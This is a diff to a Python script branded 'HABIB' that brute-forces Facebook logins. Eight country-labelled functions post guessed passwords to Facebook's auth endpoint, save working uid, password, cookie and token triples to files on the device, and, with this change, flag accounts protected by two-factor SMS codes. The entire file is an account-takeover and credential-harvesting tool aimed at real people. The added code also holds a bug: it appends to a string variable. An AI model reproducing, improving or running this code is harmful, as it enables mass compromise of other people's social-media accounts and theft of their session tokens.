@@ -1,7 +1,7 @@
 #<<_________[ METHOD 1 FOR PAKISTAN ]_________>>#
 def api1(ids,names,passlist,tl):
     try:
-        global oks,cps,loop,sim_id
+        global oks,cps,twf,loop,sim_id
         sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M1\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -56,6 +56,7 @@ def api1(ids,names,passlist,tl):
 'X-Fb-Server-Cluster': 'True',
 'Content-Length': '847'}
             url = 'https://b-graph.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
                 try:
@@ -74,6 +75,10 @@ def api1(ids,names,passlist,tl):
                     open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
                     oks.append(uid);cek_apk(uid,pas,cookies)
                     break
+            elif twf in str(po):
+                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
+                twf.append(uid)
+                break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
                 #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
@@ -90,7 +95,7 @@ def api1(ids,names,passlist,tl):
 #<<_________[ METHOD 2 FOR BANGLADESH ]_________>>#
 def api2(ids,names,passlist,tl):
     try:
-        global oks,cps,loop,sim_id
+        global oks,cps,twf,loop,sim_id
         sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M2\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -145,6 +150,7 @@ def api2(ids,names,passlist,tl):
 'X-Fb-Server-Cluster': 'True',
 'Content-Length': '847'}
             url = 'https://b-graph.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
                 try:
@@ -163,6 +169,10 @@ def api2(ids,names,passlist,tl):
                     open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
                     oks.append(uid);cek_apk(uid,pas,cookies)
                     break
+            elif twf in str(po):
+                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
+                twf.append(uid)
+                break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
                 #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
@@ -179,7 +189,7 @@ def api2(ids,names,passlist,tl):
 #<<_________[ METHOD 3 FOR NEPAL ]_________>>#
 def api3(ids,names,passlist,tl):
     try:
-        global oks,cps,loop,sim_id
+        global oks,cps,twf,loop,sim_id
         sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M3\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -234,6 +244,7 @@ def api3(ids,names,passlist,tl):
 'X-Fb-Server-Cluster': 'True',
 'Content-Length': '847'}
             url = 'https://b-graph.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
                 try:
@@ -252,6 +263,10 @@ def api3(ids,names,passlist,tl):
                     open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
                     oks.append(uid);cek_apk(uid,pas,cookies)
                     break
+            elif twf in str(po):
+                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
+                twf.append(uid)
+                break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
                 #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
@@ -268,7 +283,7 @@ def api3(ids,names,passlist,tl):
 #<<_________[ METHOD 4 FOR INDIA ]_________>>#
 def api4(ids,names,passlist,tl):
     try:
-        global oks,cps,loop,sim_id
+        global oks,cps,twf,loop,sim_id
         sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M4\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -323,6 +338,7 @@ def api4(ids,names,passlist,tl):
 'X-Fb-Server-Cluster': 'True',
 'Content-Length': '847'}
             url = 'https://b-graph.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
                 try:
@@ -341,6 +357,10 @@ def api4(ids,names,passlist,tl):
                     open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
                     oks.append(uid);cek_apk(uid,pas,cookies)
                     break
+            elif twf in str(po):
+                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
+                twf.append(uid)
+                break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
                 #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
@@ -357,7 +377,7 @@ def api4(ids,names,passlist,tl):
 #<<_________[ METHOD 5 FOR ALGERIA ]_________>>#
 def api5(ids,names,passlist,tl):
     try:
-        global oks,cps,loop,sim_id
+        global oks,cps,twf,loop,sim_id
         sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M5\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -412,6 +432,7 @@ def api5(ids,names,passlist,tl):
 'X-Fb-Server-Cluster': 'True',
 'Content-Length': '847'}
             url = 'https://b-graph.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
                 try:
@@ -430,6 +451,10 @@ def api5(ids,names,passlist,tl):
                     open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
                     oks.append(uid);cek_apk(uid,pas,cookies)
                     break
+            elif twf in str(po):
+                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
+                twf.append(uid)
+                break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
                 #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
@@ -446,7 +471,7 @@ def api5(ids,names,passlist,tl):
 #<<_________[ METHOD 6 FOR MYANMAR ]_________>>#
 def api6(ids,names,passlist,tl):
     try:
-        global oks,cps,loop,sim_id
+        global oks,cps,twf,loop,sim_id
         sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M6\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -501,6 +526,7 @@ def api6(ids,names,passlist,tl):
 'X-Fb-Server-Cluster': 'True',
 'Content-Length': '847'}
             url = 'https://b-graph.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
                 try:
@@ -519,6 +545,10 @@ def api6(ids,names,passlist,tl):
                     open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
                     oks.append(uid);cek_apk(uid,pas,cookies)
                     break
+            elif twf in str(po):
+                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
+                twf.append(uid)
+                break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
                 #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
@@ -535,7 +565,7 @@ def api6(ids,names,passlist,tl):
 #<<_________[ METHOD 6 FOR INDONESIA ]_________>>#
 def api7(ids,names,passlist,tl):
     try:
-        global oks,cps,loop,sim_id
+        global oks,cps,twf,loop,sim_id
         sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M7\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -590,6 +620,7 @@ def api7(ids,names,passlist,tl):
 'X-Fb-Server-Cluster': 'True',
 'Content-Length': '847'}
             url = 'https://b-graph.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
                 try:
@@ -608,6 +639,10 @@ def api7(ids,names,passlist,tl):
                     open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
                     oks.append(uid);cek_apk(uid,pas,cookies)
                     break
+            elif twf in str(po):
+                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
+                twf.append(uid)
+                break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
                 #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
@@ -624,7 +659,7 @@ def api7(ids,names,passlist,tl):
 #<<_________[ METHOD 6 FOR ALL COUNTIES ]_________>>#
 def api8(ids,names,passlist,tl):
     try:
-        global oks,cps,loop,sim_id
+        global oks,cps,twf,loop,sim_id
         sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M8\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -679,6 +714,7 @@ def api8(ids,names,passlist,tl):
 'X-Fb-Server-Cluster': 'True',
 'Content-Length': '847'}
             url = 'https://b-graph.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
                 try:
@@ -697,6 +733,10 @@ def api8(ids,names,passlist,tl):
                     open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
                     oks.append(uid);cek_apk(uid,pas,cookies)
                     break
+            elif twf in str(po):
+                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
+                twf.append(uid)
+                break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
                 #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
